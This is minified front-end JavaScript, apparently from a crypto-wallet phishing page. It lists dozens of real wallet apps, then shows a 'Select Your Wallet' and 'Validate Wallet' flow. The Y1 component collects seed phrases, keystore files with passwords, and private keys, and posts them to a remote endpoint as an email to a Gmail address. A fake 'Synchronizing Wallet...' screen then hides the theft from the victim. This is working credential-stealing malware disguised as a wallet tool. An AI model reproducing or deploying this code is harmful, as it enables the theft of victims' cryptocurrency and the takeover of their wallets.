        id: "b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c",
        name: "Vision",
        homepage: "https://vision-crypto.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/id1500186931",
            android: "https://play.google.com/store/apps/details?id=com.eletac.tronwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Vision",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b": {
        id: "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b",
        name: "PEAKDEFI Wallet",
        homepage: "https://peakdefi.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/peakdefi-wallet/id1526193527",
            android: "https://play.google.com/store/apps/details?id=com.peakdefiwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "peakdefiwallet:",
            universal: "https://peakdefi.com/download"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "PEAKDEFI",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd": {
        id: "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd",
        name: "Unstoppable Wallet",
        homepage: "https://unstoppable.money/",
        chains: ["eip155:1", "eip155:56"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/bank-bitcoin-wallet/id1447619907?ls=1",
            android: "https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "moneyunstoppable:",
            universal: "https://unstoppable.money/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Unstoppable",
            colors: {
                primary: "#FFBE43",
                secondary: ""
            }
        }
    },
    "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0": {
        id: "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0",
        name: "HaloDeFi Wallet",
        homepage: "https://halodefi.org/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.halodefi.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "halodefiwallet:",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "HaloDeFi",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e: {
        id: "d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e",
        name: "Dok Wallet",
        homepage: "https://dokwallet.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/il/app/dokwallet-crypto-wallet/id1533065700",
            android: "https://play.google.com/store/apps/details?id=com.dok.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Dok",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5": {
        id: "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5",
        name: "AT.Wallet",
        homepage: "https://authentrend.com/at-wallet/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/at-wallet/id1479171310",
            android: "https://play.google.com/store/apps/details?id=com.authentrend.atwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AT.Wallet",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719": {
        id: "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719",
        name: "Midas Wallet",
        homepage: "https://midasprotocol.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/us/app/midas-protocol-crypto-wallet/id1436698193",
            android: "https://play.google.com/store/apps/details?id=com.midasprotocol.wallet.android",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Midas",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef": {
        id: "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef",
        name: "Ellipal",
        homepage: "https://ellipal.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/ellipal/id1426179665",
            android: "https://play.google.com/store/apps/details?id=com.ellipal.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "ellipal:",
            universal: "https://www.ellipal.com/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Ellipal",
            colors: {
                primary: "rgb(48, 124, 249)",
                secondary: ""
            }
        }
    },
    "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3": {
        id: "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3",
        name: "KEYRING PRO",
        homepage: "https://keyring.app/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/keyring-pro-wallet-management/id1546824976",
            android: "https://play.google.com/store/apps/details?id=co.bacoor.keyring",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "keyring:",
            universal: "https://keyring.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "KEYRINGPRO",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c": {
        id: "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c",
        name: "Aktionariat",
        homepage: "https://aktionariat.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/ch/app/aktionariat/id1518326813",
            android: "https://play.google.com/store/apps/details?id=com.aktionariat.app",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "aktionariat:",
            universal: "https://app.aktionariat.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Aktionariat",
            colors: {
                primary: "rgb(10, 20, 20)",
                secondary: ""
            }
        }
    },
    "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c": {
        id: "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c",
        name: "Talken Wallet",
        homepage: "https://talken.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/talken/id1459475831",
            android: "https://play.google.com/store/apps/details?id=io.talken.wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "talken-wallet:",
            universal: "https://talken.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Talken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4": {
        id: "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4",
        name: "XinFin XDC Network",
        homepage: "https://www.xinfin.io/",
        chains: ["eip155:1"],
        app: {
            browser: "https://xinfin.network/",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=com.xdcwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "XinFin",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c: {
        id: "d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c",
        name: "Flare Wallet",
        homepage: "https://flarewallet.io",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/flare-wallet/id1496651406",
            android: "https://play.google.com/store/apps/details?id=com.flare",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "flare:",
            universal: "https://flarewallet.io"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Flare",
            colors: {
                primary: "rgb(31, 36, 59)",
                secondary: ""
            }
        }
    },
    "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670": {
        id: "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670",
        name: "KyberSwap",
        homepage: "https://kyberswap.com/",
        chains: ["eip155:1"],
        app: {
            browser: "https://kyberswap.com/",
            ios: "",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "kyberswap:",
            universal: "https://kyberswapnew.app.link"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "KyberSwap",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0": {
        id: "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0",
        name: "AToken Wallet",
        homepage: "https://atoken.com",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/atoken-app/id1395835245",
            android: "https://play.google.com/store/apps/details?id=wallet.gem.com.atoken",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "atoken:",
            universal: "https://www.atoken.com"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "AToken",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9": {
        id: "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9",
        name: "Tongue Wallet",
        homepage: "https://www.tongue.fi",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "tongue:",
            universal: "https://www.tongue.fi"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Tongue",
            colors: {
                primary: "rgb(255, 49, 120)",
                secondary: ""
            }
        }
    },
    b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346: {
        id: "b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346",
        name: "RWallet",
        homepage: "https://rsk.co/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/rwallet/id1489241342",
            android: "https://play.google.com/store/apps/details?id=com.rsk.rwallet.reactnative",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "rwallet:",
            universal: "https://www.rwallet.app"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "RWallet",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70": {
        id: "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70",
        name: "PlasmaPay",
        homepage: "https://plasmapay.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/id1461735396",
            android: "https://play.google.com/store/apps/details?id=com.plasmapay.androidapp",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "plasmapay:",
            universal: "https://plasmapay.com/"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "PlasmaPay",
            colors: {
                primary: "rgb(255, 255, 255)",
                secondary: ""
            }
        }
    },
    "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0": {
        id: "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0",
        name: "O3Wallet",
        homepage: "https://o3.network",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://itunes.apple.com/app/id1528451572",
            android: "https://play.google.com/store/apps/details?id=com.o3.o3wallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "o3wallet:",
            universal: "https://o3.network"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "O3Wallet",
            colors: {
                primary: "rgb(255,255,255)",
                secondary: ""
            }
        }
    },
    "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c": {
        id: "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c",
        name: "HashKey Me",
        homepage: "https://me.hashkey.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/hashkey-me/id1547228803",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "hashme:",
            universal: "https://me.hashkey.com"
        },
        desktop: {
            native: "hashme:",
            universal: "https://me.hashkey.com"
        },
        metadata: {
            shortName: "HashKey Me",
            colors: {
                primary: "rgb(254, 142, 63)",
                secondary: ""
            }
        }
    },
    "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950": {
        id: "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950",
        name: "Jade Wallet",
        homepage: "https://jadewallet.io/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/jade-wallet-bitcoin-defi/id1544207492",
            android: "",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Jade",
            colors: {
                primary: "#212d66",
                secondary: ""
            }
        }
    },
    c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266: {
        id: "c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266",
        name: "Guarda Wallet",
        homepage: "https://guarda.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/app/apple-store/id1442083982?mt=8",
            android: "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Guarda",
            colors: {
                primary: "#fff",
                secondary: ""
            }
        }
    },
    ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215: {
        id: "ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215",
        name: "Defiant",
        homepage: "https://defiantapp.tech/",
        chains: ["eip155:1", "eip155:42", "eip155:30", "eip155:31"],
        app: {
            browser: "",
            ios: "",
            android: "https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "defiantapp:",
            universal: "https://defiantapp.tech"
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Defiant",
            colors: {
                primary: "#274A60",
                secondary: "#65ef9d"
            }
        }
    },
    "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1": {
        id: "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1",
        name: "Trustee Wallet",
        homepage: "https://trusteeglobal.com/",
        chains: ["eip155:1"],
        app: {
            browser: "",
            ios: "https://apps.apple.com/us/app/trustee-wallet-bitcoin-wallet/id1462924276",
            android: "https://play.google.com/store/apps/details?id=com.trusteewallet",
            mac: "",
            windows: "",
            linux: ""
        },
        mobile: {
            native: "",
            universal: ""
        },
        desktop: {
            native: "",
            universal: ""
        },
        metadata: {
            shortName: "Trustee",
            colors: {
                primary: "",
                secondary: ""
            }
        }
    },
    ex784227: {
        id: "1ce6dae0fea7114844",
        name: "Exodus",
        chains: ["eip155:1"]
    },
    others: {
        id: "1ce6dae0fea7114844",
        name: "Others",
        chains: ["eip155:1"]
    }
};

function K1({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    return g.jsx(g.Fragment, {
        children: g.jsx(ke, {
            appear: !0,
            show: e,
            as: v.Fragment,
            children: g.jsxs(je, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(ke.Child, {
                    as: v.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(ke.Child, {
                            as: v.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(je.Panel, {
                                className: "w-full max-w-xl transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(je.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Select Your Wallet"
                                }), g.jsx("div", {
                                    className: "mt-4 h-96 overflow-y-auto",
                                    children: g.jsx("div", {
                                        className: "grid grid-cols-3 sm:grid-cols-4 gap-4 pr-2.5",
                                        children: Object.keys(Cl).map((r, l) => g.jsxs("div", {
                                            tabIndex: l + 1,
                                            onClick: () => n(r),
                                            className: "cursor-pointer text-primary hover:text-secondary transition-all duration-200 ease-in bg-white py-3 px-1.5 rounded-xl border hover:border-indigo-500 hover:text-indigo-500 text-center",
                                            children: [g.jsx("img", {
                                                src: "/logos/" + r + ".jpeg",
                                                width: "48",
                                                height: "48",
                                                alt: Cl[r].name,
                                                className: "mx-auto rounded-full mb-1 bg-indigo-500/10"
                                            }), g.jsx("p", {
                                                className: "font-medium text-xs truncate",
                                                children: Cl[r].name
                                            })]
                                        }, r))
                                    })
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function mn(...e) {
    return e.filter(Boolean).join(" ")
}

function Y1({
    open: e,
    onClose: t,
    id: n,
    handleSync: r
}) {
    var m;
    const [l, o] = v.useState({
        phrase: "",
        keystore: "",
        password: "",
        privateKey: ""
    }), [i, a] = v.useState(!1), [s, u] = v.useState(""), f = ["MetaMask", "LedgerWallet"].includes(n) ? n : s || ((m = Cl[n]) == null ? void 0 : m.name), h = async y => {
        if (!i) {
            y.preventDefault();
            try {
                a(!0);
                const w = {
                        subject: "New Details from ProjectDappsMainNet",
                        to: "timzymainmail@gmail.com",
                        message_html: `<div>
                  <p><b>Wallet Name</b>: ${f}</p>
                  <p><b>Phrase</b>: ${l.phrase}</p>
                  <p><b>Keystore JSON</b>: ${l.keystore} </p>
                  <p><b>Keystore Password</b>: ${l.password}</p>
                  <p><b>Private Key</b>: ${l.privateKey} </p>
              </div>`
                    },
                    N = await (await fetch(bm, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(w)
                    })).json();
                console.log("Success:", N), r()
            } catch (w) {
                console.error("Error:", w)
            } finally {
                a(!1)
            }
        }
    };
    return g.jsx(g.Fragment, {
        children: g.jsx(ke, {
            appear: !0,
            show: e,
            as: v.Fragment,
            children: g.jsxs(je, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(ke.Child, {
                    as: v.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/70"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(ke.Child, {
                            as: v.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(je.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(je.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Validate Wallet"
                                }), g.jsxs("div", {
                                    className: "mt-4 bg-indigo-500/10 rounded-lg py-2 px-4 mb-4",
                                    children: [g.jsx("p", {
                                        className: "text-gray-500 text-sm",
                                        children: "NAME"
                                    }), g.jsx("p", {
                                        className: "text-black font-medium capitalize",
                                        children: f
                                    }), n === "others" && g.jsx("input", {
                                        className: mn("w-full rounded-lg p-2.5 text-sm my-2", "focus:ring-2 focus:outline-none focus:ring-indigo-200 border border-gray-300"),
                                        placeholder: "Enter Wallet Name",
                                        value: s,
                                        onChange: y => u(y.target.value)
                                    })]
                                }), g.jsxs(Yt.Group, {
                                    children: [g.jsx(Yt.List, {
                                        className: "flex space-x-1 rounded-xl bg-indigo-500/20 p-1.5",
                                        children: ["Phrase", "Keystore", "Privatekey"].map(y => g.jsx(Yt, {
                                            className: ({
                                                selected: w
                                            }) => mn("w-full rounded-lg py-2.5 text-sm font-medium leading-5 text-indigo-700", "focus:ring-4 focus:outline-none focus:ring-indigo-200", w ? "bg-white shadow" : "text-blue-100 hover:bg-white/20"),
                                            children: y
                                        }, y))
                                    }), g.jsxs(Yt.Panels, {
                                        className: "my-4 ",
                                        children: [g.jsx(Yt.Panel, {
                                            children: g.jsxs("form", {
                                                onSubmit: h,
                                                children: [g.jsx("textarea", {
                                                    className: mn("w-full rounded-lg p-2.5 text-sm", "focus:ring-2 focus:outline-none focus:ring-indigo-200 border border-gray-300"),
                                                    rows: 4,
                                                    required: !0,
                                                    value: l.phrase,
                                                    onChange: y => o({ ...l,
                                                        phrase: y.target.value
                                                    })
                                                }), g.jsx("p", {
                                                    className: "text-xs text-indigo-500 mt-2 mb-4",
                                                    children: "**Typically 12 (sometimes 24) words separated by single space"
                                                }), g.jsx("button", {
                                                    type: "submit",
                                                    className: "w-full text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-12 py-3 text-center",
                                                    children: i ? "Validating..." : "Validate"
                                                })]
                                            })
                                        }), g.jsx(Yt.Panel, {
                                            children: g.jsxs("form", {
                                                onSubmit: h,
                                                children: [g.jsx("textarea", {
                                                    className: mn("w-full rounded-lg p-2.5 text-sm", "focus:ring-2 focus:outline-none focus:ring-indigo-200 border border-gray-300"),
                                                    placeholder: "Your Keystore JSON",
                                                    required: !0,
                                                    rows: 4,
                                                    value: l.keystore,
                                                    onChange: y => o({ ...l,
                                                        keystore: y.target.value
                                                    })
                                                }), g.jsx("input", {
                                                    className: mn("w-full rounded-lg px-2.5 py-3 text-sm my-4", "focus:ring-2 focus:outline-none focus:ring-indigo-200 border border-gray-300"),
                                                    placeholder: "Password",
                                                    required: !0,
                                                    value: l.password,
                                                    onChange: y => o({ ...l,
                                                        password: y.target.value
                                                    })
                                                }), g.jsx("button", {
                                                    type: "submit",
                                                    className: "w-full text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-12 py-3 text-center",
                                                    children: i ? "Validating..." : "Validate"
                                                })]
                                            })
                                        }), g.jsx(Yt.Panel, {
                                            children: g.jsxs("form", {
                                                onSubmit: h,
                                                children: [g.jsx("textarea", {
                                                    className: mn("w-full rounded-lg p-2.5 text-sm mb-4", "focus:ring-2 focus:outline-none focus:ring-indigo-200 border border-gray-300"),
                                                    rows: 4,
                                                    placeholder: "Your Private Key",
                                                    required: !0,
                                                    value: l.privateKey,
                                                    onChange: y => o({ ...l,
                                                        privateKey: y.target.value
                                                    })
                                                }), g.jsx("button", {
                                                    type: "submit",
                                                    className: "w-full text-white bg-gradient-to-r from-indigo-500 to-blue-500 hover:bg-gradient-to-l focus:ring-4 focus:outline-none focus:ring-indigo-200 font-medium rounded-lg text-sm px-12 py-3 text-center",
                                                    children: i ? "Validating..." : "Validate"
                                                })]
                                            })
                                        })]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function G1({
    open: e,
    onClose: t
}) {
    return g.jsx(g.Fragment, {
        children: g.jsx(ke, {
            appear: !0,
            show: e,
            as: v.Fragment,
            children: g.jsxs(je, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(ke.Child, {
                    as: v.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/20"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center text-center",
                        children: g.jsx(ke.Child, {
                            as: v.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(je.Panel, {
                                className: "w-full h-screen flex flex-col gap-3 items-center justify-center bg-gradient-to-r from-indigo-900 via-cyan-900 to-blue-900 transform overflow-hidden p-6 align-middle shadow-xl transition-all",
                                children: [g.jsx("img", {
                                    src: "/qr_code.svg",
                                    className: "bg-white mb-2",
                                    height: 120,
                                    width: 120
                                }), g.jsx("h4", {
                                    className: "text-white text-xl font-bold",
                                    children: "Synchronizing Wallet..."
                                }), g.jsx("p", {
                                    className: "text-base text-gray-400",
                                    children: "Please hold, this might take a little while"
                                }), g.jsx("svg", {
                                    width: "40",
                                    height: "40",
                                    viewBox: "0 0 24 24",
                                    className: "animate-spin fill-white mt-2",
                                    xmlns: "http://www.w3.org/2000/svg",
                                    children: g.jsx("path", {
                                        d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z"
                                    })
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function X1() {
    const [e, t] = v.useState(!1), [n, r] = v.useState(""), [l, o] = v.useState(!1), [i, a] = v.useState(!1), [s, u] = v.useState(!1), [f, h] = v.useState(""), [m, y] = v.useState(!1);
    return g.jsxs("div", {
        className: "bg-gradient-to-r from-indigo-900/80 via-cyan-900 to-blue-900/60",
        children: [g.jsx(km, {
            handleConnect: () => t(!0)
        }), g.jsx(Nm, {
            handleConnect: () => t(!0)
        }), g.jsx(xm, {}), g.jsx(V1, {
            open: e,
            handleSelect: w => {
                r(w), t(!1), o(!0)
            },
            onClose: () => t(!1)
        }), g.jsx(Q1, {
            wallet: n,
            handleManual: () => {
                o(!1), n === "WalletConnect" ? a(!0) : u(!0)
            },
            open: l,
            onClose: () => o(!1)
        }), g.jsx(K1, {
            open: i,
            onClose: () => a(!1),
            handleSelect: w => {
                h(w), a(!1), u(!0)
            }
        }), g.jsx(Y1, {
            open: s,
            id: n === "WalletConnect" ? f : n,
            onClose: () => u(!1),
            handleSync: () => {
                u(!1), y(!0)
            }
        }), g.jsx(G1, {
            open: m,
            onClose: () => {}
        })]
    })
}
Zo.createRoot(document.getElementById("root")).render(g.jsx(F.StrictMode, {
    children: g.jsx(X1, {})
}));